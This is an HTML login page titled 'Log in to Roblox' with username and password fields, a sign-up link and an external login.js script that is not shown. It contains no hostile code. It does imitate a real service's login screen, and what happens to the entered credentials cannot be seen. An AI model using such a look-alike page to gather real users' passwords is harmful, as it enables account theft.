<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log in to Roblox</title>
  <link rel="stylesheet" href="login.css" />
</head>
<body>
  <div class="login_div">
    <h1>Login to Roblox</h1>
    <form id="loginForm" autocomplete="off">
        <input type="text" id="username" placeholder="Username / Email / Phone" name="username" autocomplete="off" />
        <input type="password" id="password" placeholder="Password" name="password" autocomplete="new-password" />
        <button type="submit">Log In</button>

      </form>      
    <p class="signup-text">Don't have an account? <a href="../register/register.html">Sign Up</a></p>
  </div>

  <script src="login.js"></script>
</body>
</html>
